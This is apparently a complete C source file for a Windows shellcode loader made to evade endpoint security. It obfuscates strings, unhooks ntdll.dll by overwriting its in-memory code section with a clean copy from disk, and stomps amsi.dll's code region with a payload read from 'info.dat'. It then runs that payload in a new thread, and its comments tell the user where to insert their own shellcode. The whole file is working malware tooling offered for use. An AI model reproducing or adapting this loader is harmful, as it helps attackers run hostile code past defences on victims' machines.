#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);

VirtualProtect_t VirtualProtect_p = NULL;

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sLib[] = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0x0};
unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned int sNtdllPath_len = sizeof(sNtdllPath);
unsigned int sNtdll_len = sizeof(sNtdll);

void decrypt(char str2xor[], size_t len, char key) {
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}

HANDLE hSync;
#define SYNCER "Global\\SyncMe"
#define PIPENAME "\\\\.\\pipe\\SyncMe"
#define MUTEX 1
#define EVENT 2
#define SEMAPH 3
#define PIPE 4

// Mutex Payload Control, If you are testing and hate this put comment (:
BOOL IsPayloadRunning(int method) {

	BOOL ret = FALSE;
	
	// use global mutant
	if (method == MUTEX) {
		hSync = CreateMutex(NULL, FALSE, SYNCER);

		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hSync);
			ret = TRUE;
		}
	}
	// use global Event
	else if (method == EVENT) {
		hSync = CreateEvent(NULL, TRUE, FALSE, SYNCER); 

		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hSync);
			ret = TRUE;
		}
	}
	// use global Semaphore
	else if (method == SEMAPH) {
		hSync = CreateSemaphore(NULL, 0, 100, SYNCER);

		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hSync);
			ret = TRUE;
		}
	}
	// use named Pipe
	else if (method == PIPE) {
		hSync = CreateNamedPipe(PIPENAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL); 

		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hSync);
			ret = TRUE;
		}
	}	
	return ret;
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {

	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;

	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy fresh .text section into ntdll memory
			memcpy( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					(LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}

unsigned char key[] = "AP7t9aCKSIM01AtIOn01"; 

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { 
	
    void * ptr;
	int pid = 0;
    HANDLE hProc = NULL;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    const char* payload_file = "info.dat";                                              // Put here your bin file 
    FILE* file;																			// Put a pointer for file
    unsigned int payload_len;                                                           //unsigned char* payload;
	
	LoadLibrary("user32.dll");
	if (IsPayloadRunning(MUTEX)) { return 0; }											// Check if the payload is already running on the machine
	
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandleA((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandleA((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandleA((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandleA((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	
	// open ntdll.dll
	decrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			// failed to open ntdll.dll
			return -1;
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) { CloseHandle(hFile); return -1; }
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) { CloseHandle(hFileMapping); CloseHandle(hFile); return -1; }
	ret = UnhookNtdll(GetModuleHandleA((LPCSTR) sNtdll), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);


    file = fopen(payload_file, "rb");                                                   // Open the payload file in binary mode
    if (file == NULL) { return -1;}                                                     // return if there an error 

    HMODULE hVictimLib = LoadLibraryA((LPCSTR) sLib);                                   // Loading amsi.dll library inside the hVictumLib that will be Hallowed "Module Stomping"
    
    // Get the payload file size
    fseek(file, 0, SEEK_END);
    payload_len = ftell(file);
    fseek(file, 0, SEEK_SET);
	
	if ( hVictimLib != NULL ) {
		
        ptr = (void *) ((DWORD_PTR) hVictimLib + 0x1000);                               // Define the PTR pointer
		DWORD oldprotect = 0;		                                                    
 		VirtualProtect_p((char *) ptr, payload_len, PAGE_READWRITE, &oldprotect);       // Change protection that can be writeable from fread | Dont forget to increase the space if it stageless
        fread(ptr, payload_len, 1, file);                                               // Read the payload file into the allocated buffer
        fclose(file);                                                                   // Close the payload file

			                 															// You should decrypt your shellcode here
		VirtualProtect_p((char *) ptr, payload_len, oldprotect, &oldprotect);			// Change again the executable protection
		HANDLE ct;																		// Handle the ct
		ct = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);				// Create a new thread to run the shellcode
		WaitForSingleObject(ct, -1);													// Waiting until the thread finish to prevent returning

	}

    return 0;
}